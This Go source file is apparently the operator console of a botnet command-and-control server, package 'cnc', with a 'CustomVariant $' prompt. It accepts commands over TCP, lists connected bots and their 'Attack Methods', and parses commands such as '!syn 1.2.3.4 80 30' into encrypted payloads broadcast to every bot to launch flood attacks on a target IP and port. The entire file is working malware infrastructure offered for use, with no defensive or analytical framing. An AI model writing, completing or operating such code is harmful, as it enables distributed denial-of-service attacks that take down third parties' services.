package cnc

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"net/textproto"
	"servers/domain"
	"strings"
)

func (h *Handler) RunConnHandler(conn net.Conn) {
	defer conn.Close()

	for {
		conn.Write([]byte("\n\rCustomVariant $ "))

		r := bufio.NewReader(conn)
		cmd, err := textproto.NewReader(r).ReadLine()
		if err != nil {
			return
		}

		// ctrl + c
		if bytes.EqualFold([]byte(cmd), []byte{255, 244, 255, 253, 6}) || bytes.Contains([]byte(cmd), []byte{255, 248, 3}) {
			return
		}

		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			continue
		}

		// handle local commands
		if cmd == "bots" {
			var final string
			final += fmt.Sprintf("Total: %d\r\n", h.services.BotCache.Len())
			final += h.services.Cmds.GetBots()
			conn.Write([]byte(final))
			continue
		}

		if cmd == "methods" {
			conn.Write([]byte(formatMethods()))
			continue
		}

		if cmd == "help" {
			conn.Write([]byte(formatHelp()))
			continue
		}

		payloadString, isMethod, err := h.services.Parser.Parse(cmd)
		if err != nil {
			conn.Write([]byte(err.Error() + "\r\n"))
			continue
		}

		if isMethod {
			payload := h.services.Encrypter.Encrypt(payloadString, h.services.Encrypter.RandKey())
			h.services.Broadcaster.Broadcast(payload)

			parts := strings.Fields(cmd)
			conn.Write([]byte(fmt.Sprintf("[+] sent %s -> %s:%s for %ss to %d bots\r\n",
				parts[0], parts[1], parts[2], parts[3], h.services.BotCache.Len())))
		}
	}
}

func formatMethods() string {
	out := "\r\n  Attack Methods\r\n"
	out += "  ─────────────────────────────────────────────\r\n"

	for _, method := range domain.MethodsMap {
		out += fmt.Sprintf("  !%-8s [ip] [port] [duration]  %s  (%s)\r\n",
			method.Name, method.Description, method.Layer)
	}

	out += "\r\n"
	return out
}

func formatHelp() string {
	out := "\r\n  Commands\r\n"
	out += "  ─────────────────────────────────────────────\r\n"

	for _, cmd := range domain.CommandsMap {
		out += fmt.Sprintf("  %-10s %s\r\n", cmd.Name, cmd.Description)
	}

	out += "\r\n  Attack Usage: ![method] [ip] [port] [duration]\r\n"
	out += "  Example: !syn 1.2.3.4 80 30\r\n\r\n"
	return out
}
